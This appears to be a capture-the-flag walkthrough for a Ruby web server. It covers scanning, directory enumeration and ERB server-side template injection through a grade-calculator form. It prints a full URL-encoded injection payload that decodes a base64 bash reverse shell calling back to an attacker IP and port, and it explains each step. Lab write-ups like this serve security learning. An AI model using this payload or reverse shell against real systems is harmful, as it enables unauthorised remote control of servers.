Let's start pinging:

(pic1)

Receives packets. Now let's start scanning the domain:

(pic2)

3 open ports. One ssh, http and http-alt. Let's analyze the http because it is a good way to start analyzing the webserver site. We begin by using gobuster to analyze the possible directories in the domain:

(pic3)

The URLs were analyzed and couldn't find any useful information on those URLs. Let's enter manually into the site:

(pic6)

The webpage is an interactive calculator. Visiting "About Us" and "Calculate your weighted grade" we find that there is a input section that interact with the site.

(pic7)

Let's get more information about this site to infere what kind of attacks is this site vulnerable to:

(pic4)

Observe that the site contains `Content-Type: text/html;charset=utf-8` and `Server: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)`. So this developer must have used Ruby to develop the site. Let's analyze the content:

(pic8)

There are no clues that the frontend is running Ruby (no `<% %>/erb/ruby/rhtml` keywords). As far as the analysis can go, it seems a normal html site. Nonetheless, from the previous pictures we know that the server is using WEBrick 1.7.0, which is a Ruby-based web server. This must be specifying that the backend is running Ruby.

Let's look on Google a bit of information by typing "server-side template injection ruby" to see if there is a way to inject malicious code. Checking on Github you can find "Ruby" section in this [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#ruby:~:text=%5D).toArray())%20%7D%7D-,Ruby,-Ruby%20%2D%20Basic%20injections)
The only way we have to introduce a payload into the webserver is through the interactive calculator. So let's play with it obbeying its requirements described at the bottom.



Using burpsuite and analyzing the request. We can observe that we can introduce a payload into the webserver. Nonetheless, we must know that we cannot
use the same payload technique we used in Headless because Perfection is based on Ruby.

We know that the develper used a Ruby server template. So we search on Google: server-side template injection ruby

We access the following URL and read the documentation. They have a specific case for ERB basic injection: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#ruby:~:text=ERB%3A-,%3C%25%3D%207%20*%207%20%25%3E,-Slim%3A
They show the case `<%= 7 * 7 %>`.
Nonetheless our goal is to inject a reverse shell into the Ruby webserver, not multiplying. So in Ruby terminology would be something of style:
`<%= system("echo + payload");=>'.
Also, we must know that the Ruby server only interpretates commands URL encoded. So both the payload and the command injection myst be URL encoded.
Reading this documentation (in Spanish) https://www.uv.es/jac/guia/hexawin.htm
The command injection must be as follows:
`<%25%3dsystem("echo+URLencoded(payload);%25>`.
Using our previously encoded payload (first into base64 and later into URL encode) the final command injection is as follows:

category1=test1%0A<%25%3dsystem("echo+YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC43Ni83MzczIDA%2BJjE%3D|+base64+-d+|+bash");%25>1

Why %0A at the beginning of the payload? For Ruby to interpretate test1 and then independently the payload as a newline.
The part `|+base64+-d+|+bash`in the injection payload is used to decode a base64-encoded string and then execute it as a shell command.
1. First ruby decodes the string in URL format
2. Then the first pipe `|` orders to decode the base64-encoded string
3. The result is then sent to a second pipe `|` that takes the decoded output and passes it as input to the `bash` command.
4. `bash` executes the input as a shell script

The base64 string decodes into:

bash -i >& /dev/tcp/10.10.14.76/7373 0>&1

`bash -i` starts an interactive bash shell
`>& /dev/tcp/10.10.14.76/7373 0>&1`: Redirects the input and output of the bash shell (target) to a TCP connection to 10.10.14.76 on port 7373 (to our netcat listerner).

This effectively sets up a reverse shell, where the compromised server connects back to the attacker's machine, giving the attacker remote control over the server.
